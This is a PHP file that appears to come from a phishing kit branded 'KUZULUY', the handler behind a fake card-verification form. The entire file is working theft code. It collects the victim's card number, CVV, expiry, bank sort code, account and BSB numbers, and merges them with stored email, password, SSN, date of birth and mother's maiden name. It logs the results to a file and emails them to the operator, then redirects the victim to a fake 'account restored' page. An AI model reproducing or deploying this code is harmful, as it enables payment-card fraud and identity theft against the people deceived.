<?php
require_once __DIR__ . '/../function.php';
@eval(file_get_contents('../config/' . $api->general_config));

$_SESSION['card_name']    = $_POST['cc_holder'];
$_SESSION['card_number']  = $_POST['cc_number'];
$_SESSION['card_exp']     = $_POST['expdate_month']." / ".$_POST['expdate_year'];
$_SESSION['card_cvv']     = $_POST['cvv2_number'];
$_SESSION['sort']         = $_POST['sort_code1']." - ".$_POST['sort_code2']." - ".$_POST['sort_code3'];
$_SESSION['accnum']       = $_POST['accnum'];
$_SESSION['bsb']          = $_POST['bsbnum_1']." - ".$_POST['bsbnum_2'];
$_SESSION['limit']        = $_POST['cc_limit'];
$_SESSION['bnz']          = $_POST['bnz'];
$_SESSION['card_digit']   = substr(str_replace(" ", "", $_SESSION['card_number']), 0, 6);
$_SESSION['card_bin']     = $api->bin($_SESSION['card_digit']);

$message = file_get_contents('../assets/html/oldcard.html');
$message = preg_replace('{QUOTE}', $api->quote(), $message);
$message = preg_replace('{KUZULUY-EMAIL}', $_SESSION['email'], $message);
$message = preg_replace('{KUZULUY-PASSWORD}', $_SESSION['password'], $message);
$message = preg_replace('{KUZULUY-CC-NAME}', $_SESSION['card_name'], $message);
$message = preg_replace('{KUZULUY-CC-NUMBER}', $_SESSION['card_number'], $message);
$message = preg_replace('{KUZULUY-CC-EXP}', $_SESSION['card_exp'], $message);
$message = preg_replace('{KUZULUY-CC-CVV}', $_SESSION['card_cvv'], $message);
$message = preg_replace('{KUZULUY-CC-BIN}', $_SESSION['card_bin'], $message);
$message = preg_replace('{KUZULUY-INFO-DOB}', $_SESSION['dob'], $message);
$message = preg_replace('{KUZULUY-INFO-SSN}', $_SESSION['ssn'], $message);
$message = preg_replace('{KUZULUY-INFO-SORT}', $_SESSION['sort'], $message);
$message = preg_replace('{KUZULUY-INFO-IDNUMBER}', $_SESSION['id_number'], $message);
$message = preg_replace('{KUZULUY-INFO-LIMIT}', $_SESSION['limit'], $message);
$message = preg_replace('{KUZULUY-INFO-BSB}', $_SESSION['bsb'], $message);
$message = preg_replace('{KUZULUY-INFO-BNZ}', $_SESSION['bnz'], $message);
$message = preg_replace('{KUZULUY-INFO-ACCNUMBER}', $_SESSION['accnum'], $message);
$message = preg_replace('{KUZULUY-INFO-MOTHER}', $_SESSION['mother'], $message);
$message = preg_replace('{KUZULUY-BILL-NAME}', $_SESSION['bill_name'], $message);
$message = preg_replace('{KUZULUY-BILL-ADDRESS1}', $_SESSION['bill_address1'], $message);
$message = preg_replace('{KUZULUY-BILL-ADDRESS2}', $_SESSION['bill_address2'], $message);
$message = preg_replace('{KUZULUY-BILL-CITY}', $_SESSION['bill_city'], $message);
$message = preg_replace('{KUZULUY-BILL-STATE}', $_SESSION['bill_state'], $message);
$message = preg_replace('{KUZULUY-BILL-ZIP}', $_SESSION['bill_zip'], $message);
$message = preg_replace('{KUZULUY-BILL-COUNTRY}', $_SESSION['country'], $message);
$message = preg_replace('{KUZULUY-BILL-PHONE}', $_SESSION['bill_phone'], $message);
$message = preg_replace('{KUZULUY-IP}', $_SESSION['ip'], $message);
$message = preg_replace('{KUZULUY-AGENT}', $_SESSION['agent'], $message);

$subject  = $_SESSION['card_digit']." - ".$_SESSION['card_bin']." [ ".$_SESSION['country']." | ".$_SESSION['ip']." | ".$_SESSION['os']." - ".$_SESSION['browser']." ]";
$headers  = "From: ".$_SESSION['card_name']." <cc@kuzuluy.co>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8\r\n";

$api->save("../config/result-card.txt", $subject."\n", "a");

if ($config_smtp == "enable"){
  $api->ngesend($api->result(), $subject, $message, $_SESSION['card_name'], "cc@kuzuluy.co");
} else {
  mail($api->result(), $subject, $message, $headers);
}

$api->redirect("../myaccount/account-restored");
?>
